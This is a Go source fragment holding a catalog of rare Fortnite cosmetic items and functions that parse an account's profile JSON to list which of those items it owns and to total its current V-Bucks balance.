		{Name: "Bird Call", ID: "AthenaDance:eid_avian"},
		{Name: "Maevys", ID: "AthenaDance:emoji_s22_showdown_mae"},
		{Name: "ZetFar", ID: "AthenaDance:emoji_s22_showdown_zet"},
		{Name: "Maevys Mark", ID: "AthenaSpray:spray_showdown_mae"},
		{Name: "ZetFar's Cap", ID: "AthenaSpray:spray_showdown_zet"},
		{Name: "Painted Pirastack", ID: "AthenaSpray:spray_showdown_pi"},
		{Name: "Llamalaxy", ID: "AthenaSpray:spid_066_llamalaxy"},
		{Name: "Disco Baller", ID: "AthenaSpray:spid_065_discoballer"},
		{Name: "Kab-llama!", ID: "AthenaSpray:spid_043_flairspray"},
		{Name: "Hot Headed", ID: "AthenaSpray:spid_274_alt_3"},
		{Name: "Solo Showdown", ID: "AthenaSpray:spid_022_soloshowdown"},
		{Name: "Mako", ID: "AthenaGlider:glider_warthog"},
		{Name: "Royale X", ID: "AthenaGlider:glider_id_003_district"},
		{Name: "Squad Sail", ID: "AthenaGlider:glider_id_211_wildcatblue"},
		{Name: "Discovery", ID: "AthenaGlider:glider_id_090_celestial"},
		{Name: "Aurora", ID: "AthenaGlider:glider_id_056_carbidewhite"},
		{Name: "Rotor", ID: "AthenaGlider:glider_id_075_modernmilitaryred"},
		{Name: "Stealth Pivot", ID: "AthenaGlider:glider_id_137_streetopsstealth"},
		{Name: "Dark Forerunner", ID: "AthenaGlider:glider_id_131_speedymidnight"},
		{Name: "Sir Glider the Brave", ID: "AthenaGlider:glider_id_002_medieval"},
		{Name: "Rainbow Rider", ID: "AthenaGlider:glider_id_015_brite"},
		{Name: "Rose Rider", ID: "AthenaGlider:glider_id_161_roseleader"},
		{Name: "Founder's Glider", ID: "AthenaGlider:founderglider"},
		{Name: "Warthog", ID: "AthenaGlider:glider_military"},
		{Name: "Blue Streak", ID: "AthenaGlider:glider_id_013_psblue"},
		{Name: "Flappy", ID: "AthenaGlider:glider_id_067_psburnout"},
		{Name: "Coaxial Blue", ID: "AthenaGlider:glider_id_150_techopsblue"},
		{Name: "Blue Viper", ID: "AthenaGlider:glider_id_309_tacticalwoodlandblue"},
		{Name: "Snow Sailer", ID: "AthenaGlider:glider_id_389_blizzardbomberfemale"},
		{Name: "Cryptic Coaster", ID: "AthenaGlider:glider_snowsoldierfashion"},
		{Name: "Astroworld Cyclone", ID: "AthenaGlider:glider_id_196_cyclonemale"},
		{Name: "Diamond Pony", ID: "AthenaGlider:glider_id_347_peachmale"},
		{Name: "Founder's Umbrella", ID: "AthenaGlider:founderumbrella"},
		{Name: "Snowflake", ID: "AthenaGlider:umbrella_snowflake"},
		{Name: "Paper Parasol", ID: "AthenaGlider:umbrella_paperparasol"},
		{Name: "One Shot", ID: "AthenaGlider:umbrella_assassinsuit"},
		{Name: "Beast Brella", ID: "AthenaGlider:umbrella_lettuce"},
		{Name: "Beskar Umbrella", ID: "AthenaGlider:umbrella_vendetta"},
		{Name: "Weathered Snow Stripes", ID: "AthenaItemWrap:wrap_snowninjadark"},
		{Name: "Cobalt Overdrive", ID: "AthenaItemWrap:wrap_333_stealthwoodland"},
		{Name: "Hex Code", ID: "AthenaItemWrap:wrap_unknownnetwork"},
		{Name: "Light Burst", ID: "AthenaItemWrap:wrap_dyedburst"},
		{Name: "Goosebumps", ID: "AthenaItemWrap:wrap_210_thermal"},
		{Name: "Rainbow Fog", ID: "AthenaItemWrap:wrap_303_gascloud"},
		{Name: "Blue Fusion", ID: "AthenaSkyDiveContrail:trails_id_059_sony2"},
		{Name: "Cobalt Cloudbreak", ID: "AthenaSkyDiveContrail:trails_id_123_tacticalwoodlandblue"},
		{Name: "Snowball Flight", ID: "AthenaSkyDiveContrail:trails_id_150_avalanche"},
		{Name: "Alpha Tester 11", ID: "HomebaseBannerIcon:ot11banner"},
		{Name: "Alpha Tester 10", ID: "HomebaseBannerIcon:ot10banner"},
		{Name: "Alpha Tester 9", ID: "HomebaseBannerIcon:ot9banner"},
		{Name: "Alpha Tester 8", ID: "HomebaseBannerIcon:ot8banner"},
		{Name: "Alpha Tester 7", ID: "HomebaseBannerIcon:ot7banner"},
		{Name: "Alpha Tester 6", ID: "HomebaseBannerIcon:ot6banner"},
		{Name: "Alpha Tester 5", ID: "HomebaseBannerIcon:ot5banner"},
		{Name: "Alpha Tester 4", ID: "HomebaseBannerIcon:ot4banner"},
		{Name: "Alpha Tester 3", ID: "HomebaseBannerIcon:ot3banner"},
		{Name: "Alpha Tester 2", ID: "HomebaseBannerIcon:ot2banner"},
		{Name: "Alpha Tester 1", ID: "HomebaseBannerIcon:ot1banner"},
		{Name: "Paragon", ID: "HomebaseBannerIcon:otherbanner51"},
		{Name: "Battle Bus", ID: "HomebaseBannerIcon:brseason01"},
		{Name: "Fortnite", ID: "HomebaseBannerIcon:newsletterbanner"},
		{Name: "Krampus Smasher", ID: "HomebaseBannerIcon:winter2018krampus"},
		{Name: "Bear Trap", ID: "HomebaseBannerIcon:winter2018beartrapfoot"},
		{Name: "Cooker", ID: "HomebaseBannerIcon:winter2018cooker"},
		{Name: "Buried Snowman", ID: "HomebaseBannerIcon:winter2018snowmanburied"},
		{Name: "Snowman in Danger", ID: "HomebaseBannerIcon:winter2018crownflame"},
		{Name: "Icicle Cluster", ID: "HomebaseBannerIcon:winter2018iciclecluster"},
		{Name: "Castle Tower", ID: "HomebaseBannerIcon:winter2018tower"},
		{Name: "Burning Crown", ID: "HomebaseBannerIcon:winter2018wave30complete"},
		{Name: "Sad Gingerbread Man", ID: "HomebaseBannerIcon:winter2018gingerbreadman"},
		{Name: "Dungeons Champion", ID: "HomebaseBannerIcon:starlightbanner6"},
		{Name: "Dungeons Quests", ID: "HomebaseBannerIcon:starlightbanner5"},
		{Name: "The Labyrinth", ID: "HomebaseBannerIcon:starlightbanner4"},
		{Name: "The Grotto", ID: "HomebaseBannerIcon:starlightbanner3"},
		{Name: "The Inferno", ID: "HomebaseBannerIcon:starlightbanner2"},
		{Name: "The Crypts", ID: "HomebaseBannerIcon:starlightbanner1"},
		{Name: "Twine Peaks Endurance Banner", ID: "HomebaseBannerIcon:endurancewave30theater04"},
		{Name: "Canny Valley Endurance Banner", ID: "HomebaseBannerIcon:endurancewave30theater03"},
		{Name: "Plankerton Endurance Banner", ID: "HomebaseBannerIcon:endurancewave30theater02"},
		{Name: "Stonewood Endurance Banner", ID: "HomebaseBannerIcon:endurancewave30theater01"},
		{Name: "Teleportation Rifts", ID: "HomebaseBannerIcon:wargamestprifts"},
		{Name: "Tiki Trouble", ID: "HomebaseBannerIcon:wargamestiki"},
		{Name: "Jungle Pod", ID: "HomebaseBannerIcon:wargamespods"},
		{Name: "Cow Skull", ID: "HomebaseBannerIcon:survivalbannerstorm2018med"},
		{Name: "Horde Desert 4", ID: "HomebaseBannerIcon:hordebanner2018twinepeaks"},
		{Name: "Meteors", ID: "HomebaseBannerIcon:wargamesmeteor"},
		{Name: "Tornado", ID: "HomebaseBannerIcon:wargamestornado"},
		{Name: "Unspeakable Horrors", ID: "HomebaseBannerIcon:achievementunspeakablehorrors"},
		{Name: "World Explorer", ID: "HomebaseBannerIcon:achievementworldexplorer"},
		{Name: "Guardian Angel", ID: "HomebaseBannerIcon:achievementguardianangel"},
		{Name: "Plays Well with Others", ID: "HomebaseBannerIcon:achievementplayswellwithothers"},
		{Name: "Talented Builder", ID: "HomebaseBannerIcon:achievementtalentedbuilder"},
		{Name: "Go Gnome!", ID: "HomebaseBannerIcon:achievementgognome"},
		{Name: "Loot Legend", ID: "HomebaseBannerIcon:achievementlootlegend"},
		{Name: "Survival Plankerton", ID: "HomebaseBannerIcon:survivalbannerplankertoncomplete"},
		{Name: "Survival Canny Valley", ID: "HomebaseBannerIcon:survivalbannercannyvalleycomplete"},
		{Name: "Survival 140+", ID: "HomebaseBannerIcon:survivalbannerstonewoodcomplete"},
		{Name: "Arazhul", ID: "HomebaseBannerIcon:influencerbanner1"},
		{Name: "Arekkz Gaming", ID: "HomebaseBannerIcon:influencerbanner2"},
		{Name: "Beanie", ID: "HomebaseBannerIcon:influencerbanner3"},
		{Name: "Chaosflo44", ID: "HomebaseBannerIcon:influencerbanner4"},
		{Name: "Daithi De Nogla", ID: "HomebaseBannerIcon:influencerbanner5"},
		{Name: "Dhalucard", ID: "HomebaseBannerIcon:influencerbanner6"},
		{Name: "ElChurches", ID: "HomebaseBannerIcon:influencerbanner7"},
		{Name: "Folagor03", ID: "HomebaseBannerIcon:influencerbanner8"},
		{Name: "GermanLetsPlay", ID: "HomebaseBannerIcon:influencerbanner9"},
		{Name: "Gronie1988", ID: "HomebaseBannerIcon:influencerbanner10"},
		{Name: "H2ODelirious", ID: "HomebaseBannerIcon:influencerbanner11"},
		{Name: "I AM WILDCAT", ID: "HomebaseBannerIcon:influencerbanner12"},
		{Name: "IHasCupquake", ID: "HomebaseBannerIcon:influencerbanner13"},
		{Name: "Jesse Cox", ID: "HomebaseBannerIcon:influencerbanner14"},
		{Name: "JesusAVGN", ID: "HomebaseBannerIcon:influencerbanner15"},
		{Name: "KeysJore", ID: "HomebaseBannerIcon:influencerbanner16"},
		{Name: "King Gothalion", ID: "HomebaseBannerIcon:influencerbanner17"},
		{Name: "KNekroGamer", ID: "HomebaseBannerIcon:influencerbanner18"},
		{Name: "LaurenzSide", ID: "HomebaseBannerIcon:influencerbanner19"},
		{Name: "Anas (MrLebledart)", ID: "HomebaseBannerIcon:influencerbanner20"},
		{Name: "Makina", ID: "HomebaseBannerIcon:influencerbanner21"},
		{Name: "Menos Trece", ID: "HomebaseBannerIcon:influencerbanner22"},
		{Name: "Mini Ladd", ID: "HomebaseBannerIcon:influencerbanner23"},
		{Name: "MM7Games", ID: "HomebaseBannerIcon:influencerbanner24"},
		{Name: "Mr. Fruit", ID: "HomebaseBannerIcon:influencerbanner25"},
		{Name: "Muselk", ID: "HomebaseBannerIcon:influencerbanner26"},
		{Name: "NVidia", ID: "HomebaseBannerIcon:influencerbanner27"},
		{Name: "Ohmwrecker", ID: "HomebaseBannerIcon:influencerbanner28"},
		{Name: "Орк-подкастер", ID: "HomebaseBannerIcon:influencerbanner29"},
		{Name: "PressHeartToContinue", ID: "HomebaseBannerIcon:influencerbanner30"},
		{Name: "Professor Broman", ID: "HomebaseBannerIcon:influencerbanner31"},
		{Name: "Revenant", ID: "HomebaseBannerIcon:influencerbanner32"},
		{Name: "SeaNanners", ID: "HomebaseBannerIcon:influencerbanner33"},
		{Name: "Siphano", ID: "HomebaseBannerIcon:influencerbanner34"},
		{Name: "Super Beard Bros A", ID: "HomebaseBannerIcon:influencerbanner35"},
		{Name: "Super Beard Bros B", ID: "HomebaseBannerIcon:influencerbanner36"},
		{Name: "Tonioo25", ID: "HomebaseBannerIcon:influencerbanner37"},
		{Name: "Unreal Engine", ID: "HomebaseBannerIcon:influencerbanner38"},
		{Name: "VanossGaming", ID: "HomebaseBannerIcon:influencerbanner39"},
		{Name: "VK", ID: "HomebaseBannerIcon:influencerbanner40"},
		{Name: "windy31", ID: "HomebaseBannerIcon:influencerbanner41"},
		{Name: "YouAlwaysWin", ID: "HomebaseBannerIcon:influencerbanner42"},
		{Name: "YOGSCAST", ID: "HomebaseBannerIcon:influencerbanner43"},
		{Name: "ZackScottGames", ID: "HomebaseBannerIcon:influencerbanner44"},
		{Name: "Alexclick", ID: "HomebaseBannerIcon:influencerbanner45"},
		{Name: "Ionix_Tv", ID: "HomebaseBannerIcon:influencerbanner46"},
		{Name: "Dr_Horse", ID: "HomebaseBannerIcon:influencerbanner47"},
		{Name: "Berserage", ID: "HomebaseBannerIcon:influencerbanner48"},
		{Name: "Drae", ID: "HomebaseBannerIcon:influencerbanner49"},
		{Name: "Blitz", ID: "HomebaseBannerIcon:influencerbanner50"},
		{Name: "CaRtOoNz", ID: "HomebaseBannerIcon:influencerbanner51"},
		{Name: "Starsnipe", ID: "HomebaseBannerIcon:influencerbanner52"},
		{Name: "Baron Von Gamez", ID: "HomebaseBannerIcon:influencerbanner53"},
		{Name: "alexelcapo", ID: "HomebaseBannerIcon:influencerbanner54"},
		{Name: "Gameaholix TV", ID: "HomebaseBannerIcon:influencerbanner55"},
		{Name: "Nefarius AP", ID: "HomebaseBannerIcon:influencerbanner56"},
		{Name: "PewDiePie", ID: "HomebaseBannerIcon:influencerbanner57"},
		{Name: "PokeR988TV", ID: "HomebaseBannerIcon:influencerbanner58"},
		{Name: "Maevys", ID: "HomebaseBannerIcon:brs22_showdown_mae"},
		{Name: "Gnome", ID: "HomebaseBannerIcon:foundertier5banner1"},
		{Name: "Poo", ID: "HomebaseBannerIcon:foundertier5banner2"},
		{Name: "T.E.D.D.Y.", ID: "HomebaseBannerIcon:foundertier5banner3"},
		{Name: "Banana", ID: "HomebaseBannerIcon:foundertier5banner4"},
		{Name: "Knife", ID: "HomebaseBannerIcon:foundertier5banner5"},
		{Name: "Comet", ID: "HomebaseBannerIcon:foundertier4banner1"},
		{Name: "Bomb 2", ID: "HomebaseBannerIcon:foundertier4banner2"},
		{Name: "Atom", ID: "HomebaseBannerIcon:foundertier4banner3"},
		{Name: "Bunny", ID: "HomebaseBannerIcon:foundertier4banner4"},
		{Name: "Cheese", ID: "HomebaseBannerIcon:foundertier4banner5"},
		{Name: "Yin Yang", ID: "HomebaseBannerIcon:foundertier3banner1"},
		{Name: "Radioactive", ID: "HomebaseBannerIcon:foundertier3banner2"},
		{Name: "Paintbrush", ID: "HomebaseBannerIcon:foundertier3banner3"},
		{Name: "Hot Dog", ID: "HomebaseBannerIcon:foundertier3banner4"},
		{Name: "Spider", ID: "HomebaseBannerIcon:foundertier3banner5"},
		{Name: "Pizza", ID: "HomebaseBannerIcon:foundertier2banner1"},
		{Name: "Outlander", ID: "HomebaseBannerIcon:foundertier2banner2"},
		{Name: "Ninja", ID: "HomebaseBannerIcon:foundertier2banner3"},
		{Name: "Steel Wool", ID: "HomebaseBannerIcon:foundertier2banner4"},
		{Name: "Skull", ID: "HomebaseBannerIcon:foundertier2banner5"},
		{Name: "Trophy", ID: "HomebaseBannerIcon:foundertier1banner1"},
		{Name: "Constructor", ID: "HomebaseBannerIcon:foundertier1banner2"},
		{Name: "Soldier", ID: "HomebaseBannerIcon:foundertier1banner3"},
		{Name: "Durrr Burger", ID: "HomebaseBannerIcon:foundertier1banner4"},
		{Name: "Founder Deluxe Banner 5", ID: "HomebaseBannerIcon:foundertier1banner5"},
		{Name: "Holiday Survival Hard", ID: "HomebaseBannerIcon:survivalbannerholidayhard"},
		{Name: "Holiday Survival Medium", ID: "HomebaseBannerIcon:survivalbannerholidaymed"},
		{Name: "Holiday Survival Easy", ID: "HomebaseBannerIcon:survivalbannerholidayeasy"},
		{Name: "Scorpion", ID: "HomebaseBannerIcon:survivalbannerstorm2018hard"},
		{Name: "Cactus", ID: "HomebaseBannerIcon:survivalbannerstorm2018easy"},
		{Name: "Season X Level 100", ID: "HomebaseBannerIcon:brs10level100"},
		{Name: "Season 9 Level 100", ID: "HomebaseBannerIcon:brs9lvl100"},
		{Name: "Season 8 Level 100", ID: "HomebaseBannerIcon:brs8level100"},
		{Name: "Fortnite", ID: "HomebaseBannerIcon:newsletterbanne"},
		{Name: "World Cup 2019 Banner", ID: "HomebaseBannerIcon:brworldcup2019"},
		{Name: "FNCS", ID: "HomebaseBannerIcon:brs23_fncs_drops"},
		{Name: "[[Mecha Team Banner]]", ID: "HomebaseBannerIcon:brs9doggus"},
		{Name: "[[Monster Team Banner]]", ID: "HomebaseBannerIcon:brs9cattus"},
		{Name: "Chani", ID: "AthenaCharacter:cid_a_215_athena_commando_f_sunrisecastle_48tiz"},
		{Name: "Lyric", ID: "AthenaCharacter:cid_a_381_athena_commando_f_cactusrocker_3htbv"},
		{Name: "Desert Dawn Lyric", ID: "AthenaCharacter:character_tigerrootfame"},
		{Name: "Spycatcher Siren", ID: "AthenaCharacter:character_hitman_dark"},
		{Name: "Spirit Hunter Saeko", ID: "AthenaCharacter:character_voltaichuntress"},
		{Name: "Leon S. Kennedy", ID: "AthenaCharacter:character_fallvalleyblink"},
		{Name: "Claire Redfield", ID: "AthenaCharacter:character_fallvalleycharge"},
		{Name: "Striped Slinger", ID: "AthenaCharacter:character_upbeatiguana_d"},
		{Name: "Chill Challenger", ID: "AthenaCharacter:character_upbeatiguana"},
		{Name: "T-800", ID: "AthenaCharacter:cid_993_athena_commando_m_typhoonrobot_2yrgv"},
		{Name: "Polo Prodigy", ID: "AthenaCharacter:character_stallionaviator"},
		{Name: "Catwoman Comic Book Outfit", ID: "AthenaCharacter:cid_530_athena_commando_f_blackmonday_1bv6j"},
		{Name: "Modena Icon", ID: "AthenaCharacter:cid_a_138_athena_commando_f_foray_yqpb0"},
		{Name: "Unchained Ramirez", ID: "AthenaCharacter:cid_a_205_athena_commando_f_textileram_gmrj0"},
		{Name: "Fashion Banshee", ID: "AthenaCharacter:cid_a_206_athena_commando_f_textilesparkle_v8ysa"},
		{Name: "Game Knight", ID: "AthenaCharacter:cid_a_207_athena_commando_m_textileknight_9te8l"},
		{Name: "Shady Doggo", ID: "AthenaCharacter:cid_a_208_athena_commando_m_textilepup_c85od"},
		{Name: "Grind", ID: "AthenaCharacter:cid_424_athena_commando_m_vigilante"},
		{Name: "Clutch", ID: "AthenaCharacter:cid_423_athena_commando_f_painter"},
		{Name: "Renee", ID: "AthenaCharacter:cid_a_266_athena_commando_f_grandeur_9co1m"},
		{Name: "Andre", ID: "AthenaCharacter:cid_a_265_athena_commando_m_grandeur_tbc0o"},
		{Name: "Covert Cobalt", ID: "AthenaCharacter:character_bluemystery_dark"},
		{Name: "Shady Zadie", ID: "AthenaCharacter:character_pinktrooperdark"},
		{Name: "Dark Ruby", ID: "AthenaCharacter:character_darkvogue"},
		{Name: "Arcane Jinx", ID: "AthenaCharacter:cid_a_256_athena_commando_f_uproarbraids_8iozw"},
		{Name: "Arcane Vi", ID: "AthenaCharacter:cid_a_329_athena_commando_f_uproar_i5n5z"},
		{Name: "Sakura", ID: "AthenaCharacter:cid_a_385_athena_commando_f_rumble"},
		{Name: "Cammy", ID: "AthenaCharacter:cid_a_162_athena_commando_f_quarrel_e5d63"},
		{Name: "Guile", ID: "AthenaCharacter:cid_a_161_athena_commando_m_quarrel_slxqg"},
		{Name: "Blanka", ID: "AthenaCharacter:cid_a_384_athena_commando_m_rumble"},
		{Name: "Chun-Li", ID: "AthenaCharacter:cid_a_024_athena_commando_f_skirmish_qw2bq"},
		{Name: "Ryu", ID: "AthenaCharacter:cid_a_023_athena_commando_m_skirmish_w1n7h"},
		{Name: "Harley Quinn", ID: "AthenaCharacter:cid_704_athena_commando_f_lollipoptrickster"},
		{Name: "Echo", ID: "AthenaCharacter:cid_715_athena_commando_f_twindark"},
		{Name: "Windwalker Echo", ID: "AthenaCharacter:cid_a_047_athena_commando_f_windwalker"},
		{Name: "Surf Witch", ID: "AthenaCharacter:cid_805_athena_commando_f_punkdevilsummer"},
		{Name: "Par Patroller", ID: "AthenaCharacter:cid_801_athena_commando_f_golfsummer"},
		{Name: "Holly Jammer", ID: "AthenaCharacter:cid_650_athena_commando_f_holidaypj_b"},
		{Name: "Designer Tsuki", ID: "AthenaCharacter:character_fauxvenom"},
		{Name: "Lucky Rider", ID: "AthenaCharacter:cid_365_athena_commando_m_luckyrider"},
		{Name: "Dark Red Knight", ID: "AthenaCharacter:cid_512_athena_commando_f_cubepaintredknight"},
		{Name: "Frozen Nog Ops", ID: "AthenaCharacter:cid_653_athena_commando_f_uglysweaterfrozen"},
		{Name: "Comet", ID: "AthenaCharacter:character_brightion"},
		{Name: "Field Surgeon", ID: "AthenaCharacter:cid_216_athena_commando_f_medic"},
		{Name: "Fennec Shand", ID: "AthenaCharacter:cid_a_338_athena_commando_f_galactic_hn9d"},
		{Name: "FFC Sparkplug", ID: "AthenaCharacter:character_redoasispomegranate"},
		{Name: "FFC Chloe Kim", ID: "AthenaCharacter:character_redoasisapricot"},
		{Name: "Party Diva", ID: "AthenaCharacter:cid_819_athena_commando_f_neontightsuit_b"},
		{Name: "Astrea", ID: "AthenaCharacter:character_supernovataro"},
		{Name: "Rainbow Racer", ID: "AthenaCharacter:cid_a_096_athena_commando_f_taxiupgradedmulticolor"},
		{Name: "B.R.I.T.E.", ID: "AthenaCharacter:cid_a_388_athena_commando_f_lyrical"},
		{Name: "Throwback BG", ID: "AthenaCharacter:cid_a_387_athena_commando_m_lyrical"},
		{Name: "Backlash", ID: "AthenaCharacter:cid_861_athena_commando_f_elastic_b"},
		{Name: "They're Back-Lash", ID: "AthenaCharacter:cid_a_250_athena_commando_f_zombieelastic_b"},
		{Name: "Risky Raider", ID: "AthenaCharacter:cid_a_443_athena_commando_f_pennantseasone_c"},
		{Name: "Salty Striker", ID: "AthenaCharacter:cid_a_444_athena_commando_f_pennantseasone_d"},
		{Name: "Tilted Trooper", ID: "AthenaCharacter:cid_a_441_athena_commando_f_pennantseasone"},
		{Name: "Mogul Master (FRA)", ID: "AthenaCharacter:cid_065_athena_commando_f_skigirl_fra"},
		{Name: "Mogul Master (USA)", ID: "AthenaCharacter:cid_062_athena_commando_f_skigirl_usa"},
		{Name: "Mogul Master (GER)", ID: "AthenaCharacter:cid_066_athena_commando_f_skigirl_ger"},
		{Name: "Mogul Master (GBR)", ID: "AthenaCharacter:cid_064_athena_commando_f_skigirl_gbr"},
		{Name: "Mogul Master (CAN)", ID: "AthenaCharacter:cid_063_athena_commando_f_skigirl_can"},
		{Name: "Mogul Master (KOR)", ID: "AthenaCharacter:cid_068_athena_commando_f_skigirl_kor"},
		{Name: "Recon Champion", ID: "AthenaCharacter:character_reconexpert_fncs"},
		{Name: "Champion Sparkplug", ID: "AthenaCharacter:character_garbagefncs"},
		{Name: "Championship Aura", ID: "AthenaCharacter:character_treasurehunterfashionsfncs"},
		{Name: "Snowy Ops", ID: "AthenaCharacter:character_leatherkey"},
		{Name: "Vanguard Banshee", ID: "AthenaCharacter:cid_888_athena_commando_f_chonebanshee"},
		{Name: "Wildstreak One", ID: "AthenaCharacter:cid_889_athena_commando_f_chonewildcat"},
		{Name: "Vintage Ramirez", ID: "AthenaCharacter:cid_884_athena_commando_f_choneramirez"},
		{Name: "Hawk Classic", ID: "AthenaCharacter:cid_885_athena_commando_m_chonehawk"},
		{Name: "Rainbow Clover", ID: "AthenaBackpack:bid_229_luckyridermale"},
		{Name: "Gold Token", ID: "AthenaBackpack:bid_273_assassinsuitcoin"},
		{Name: "Harley Hitter", ID: "AthenaPickaxe:pickaxe_id_363_lollipoptricksterfemale"},
		{Name: "Reaper", ID: "AthenaPickaxe:halloweenscythe"},
		{Name: "Candy Axe", ID: "AthenaPickaxe:pickaxe_id_015_holidaycandycane"},
		{Name: "Catwoman's Grappling Claw", ID: "AthenaPickaxe:pickaxe_id_599_cavernfemale"},
		{Name: "Cold Snap", ID: "AthenaPickaxe:pickaxe_id_138_gnome"},
		{Name: "Splinter's Staff", ID: "AthenaPickaxe:pickaxe_slowburn"},
		{Name: "Royal Naboo Staff", ID: "AthenaPickaxe:pickaxe_ironblaze"},
		{Name: "Studded Axe", ID: "AthenaPickaxe:pickaxe_id_074_sharpdresser"},
		{Name: "Ice Breaker", ID: "AthenaPickaxe:pickaxe_id_014_wintercamo"},
		{Name: "Throwback Axe", ID: "AthenaPickaxe:pickaxe_id_475_chonepickaxe"},
		{Name: "Popular Vibe", ID: "AthenaDance:eid_speeddial"},
		{Name: "Jabba Switchway", ID: "AthenaDance:eid_januarybop"},
		{Name: "Without You", ID: "AthenaDance:eid_devotion"},
		{Name: "Get Griddy", ID: "AthenaDance:eid_griddles"},
		{Name: "Copines", ID: "AthenaDance:eid_coping"},
		{Name: "Rage", ID: "AthenaDance:eid_cyclone"},
		{Name: "Pump Me Up", ID: "AthenaDance:eid_punctual"},
		{Name: "Breakneck", ID: "AthenaDance:eid_breakdance2"},
		{Name: "Jaywalking", ID: "AthenaDance:eid_jaywalking"},
		{Name: "Raise The Cup", ID: "AthenaDance:eid_letsplay"},
		{Name: "Rocket Science", ID: "AthenaGlider:glider_id_314_spacechimpmale"},
		{Name: "The O.G.", ID: "AthenaGlider:glider_id_244_choneglider"},
		{Name: "Feel It", ID: "AthenaDance:eid_harmony"},
		{Name: "Trophy Drop", ID: "AthenaDance:eid_threedee"},
		{Name: "Ride The Pony", ID: "AthenaDance:eid_ridethepony_athena"},
	}
}


func itemHasVariant(attrs map[string]interface{}, channel, stage string) bool {
	if channel == "" || stage == "" {
		return true
	}
	raw, ok := attrs["variants"]
	if !ok {
		return false
	}
	list, ok := raw.([]interface{})
	if !ok {
		return false
	}
	wantCh := strings.ToLower(channel)
	wantSt := strings.ToLower(stage)
	altSt := wantSt
	if strings.HasPrefix(wantSt, "stage") {
		altSt = "mat" + strings.TrimPrefix(wantSt, "stage")
	} else if strings.HasPrefix(wantSt, "mat") {
		altSt = "stage" + strings.TrimPrefix(wantSt, "mat")
	}
	matchTag := func(tag string) bool {
		t := strings.ToLower(tag)
		return strings.Contains(t, wantSt) || strings.Contains(t, altSt)
	}
	for _, v := range list {
		obj, ok := v.(map[string]interface{})
		if !ok {
			continue
		}
		ch, _ := obj["channel"].(string)
		if strings.ToLower(ch) != wantCh {
			continue
		}
		active, _ := obj["active"].(string)
		if matchTag(active) {
			return true
		}
		if owned, ok := obj["owned"].([]interface{}); ok {
			for _, o := range owned {
				if s, ok := o.(string); ok && matchTag(s) {
					return true
				}
			}
		}
	}
	return false
}

func collectAthenaItems(src string) map[string]map[string]interface{} {
	out := map[string]map[string]interface{}{}
	var root interface{}
	if json.Unmarshal([]byte(src), &root) != nil {
		return out
	}
	var walk func(v interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			if tid, ok := t["templateId"].(string); ok && tid != "" {
				attrs, _ := t["attributes"].(map[string]interface{})
				if attrs == nil {
					attrs = map[string]interface{}{}
				}
				out[strings.ToLower(tid)] = attrs
			}
			for _, child := range t {
				walk(child)
			}
		case []interface{}:
			for _, child := range t {
				walk(child)
			}
		}
	}
	walk(root)
	return out
}

func specialKind(id string) string {
	low := strings.ToLower(id)
	switch {
	case strings.HasPrefix(low, "athenacharacter:"):
		return "Skins"
	case strings.HasPrefix(low, "athenabackpack:"):
		return "Backblings"
	case strings.HasPrefix(low, "athenapickaxe:"):
		return "Pickaxes"
	case strings.HasPrefix(low, "athenaglider:"):
		return "Gliders"
	case strings.HasPrefix(low, "athenadance:"):
		return "Emotes"
	default:
		return "Other"
	}
}

func detectSpecials(athenaJSON string) string {
	items := collectAthenaItems(athenaJSON)
	grouped := map[string][]string{}
	seen := map[string]bool{}
	order := []string{"Skins", "Backblings", "Pickaxes", "Gliders", "Emotes", "Other"}
	for _, def := range specialCatalog() {
		attrs, ok := items[strings.ToLower(def.ID)]
		if !ok {
			continue
		}
		okVar := true
		for _, need := range def.Variants {
			if !itemHasVariant(attrs, need.Channel, need.Stage) {
				okVar = false
				break
			}
		}
		if !okVar {
			continue
		}
		key := def.Name
		if seen[key] {
			continue
		}
		seen[key] = true
		kind := specialKind(def.ID)
		grouped[kind] = append(grouped[kind], def.Name)
	}
	var parts []string
	for _, kind := range order {
		names := grouped[kind]
		if len(names) == 0 {
			continue
		}
		parts = append(parts, fmt.Sprintf("[%s: %s]", kind, strings.Join(names, ", ")))
	}
	return strings.Join(parts, " ")
}

func itemQuantity(obj map[string]interface{}) int {
	switch q := obj["quantity"].(type) {
	case float64:
		return int(q)
	case json.Number:
		n, _ := q.Int64()
		return int(n)
	}
	return 0
}

func parseVbucks(src string) int {
	// Ledger rows have no platform / platform "None" (every pack ever received).
	// Current balance is Currency:Mtx* with a real platform: Shared, Live, IOSAppStore, etc.
	total := 0
	var walk func(v interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			tid, _ := t["templateId"].(string)
			if strings.HasPrefix(strings.ToLower(tid), "currency:mtx") {
				plat := ""
				if attrs, ok := t["attributes"].(map[string]interface{}); ok {
					plat, _ = attrs["platform"].(string)
				}
				if plat != "" && !strings.EqualFold(plat, "None") {
					total += itemQuantity(t)
				}
			}
			for _, child := range t {
				walk(child)
			}
		case []interface{}:
			for _, child := range t {
				walk(child)
			}
		}
	}
	var root interface{}
	if json.Unmarshal([]byte(src), &root) == nil {
		walk(root)
	}
	return total
}
